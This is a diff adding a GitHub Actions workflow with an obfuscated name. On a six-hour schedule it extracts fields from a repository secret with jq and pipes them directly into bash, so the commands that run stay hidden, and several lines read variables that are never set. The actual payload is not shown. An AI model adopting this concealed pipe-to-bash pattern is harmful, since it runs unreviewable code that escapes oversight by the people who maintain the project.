@@ -1,0 +1,24 @@
+name: duanhongriyu
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '14 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: duanhongriyu
+        env:
+          cgb5: ${{ secrets.cgb5 }}
+        run: |
+          echo $cgb5 | jq -r .onhrm9 | /bin/bash
+          echo $iqh8799 | jq -r .q24 | /bin/bash
+          echo $ydjfg1 | jq -r .qzhv0 | /bin/bash
+          echo $hmjg0813 | jq -r .rhi14 | /bin/bash
+          echo $js9679 | jq -r .cmz862 | /bin/bash
+          echo $crvkw3203 | jq -r .iluez230 | /bin/bash
+          echo $jq9601 | jq -r .dkyi238 | /bin/bash
+
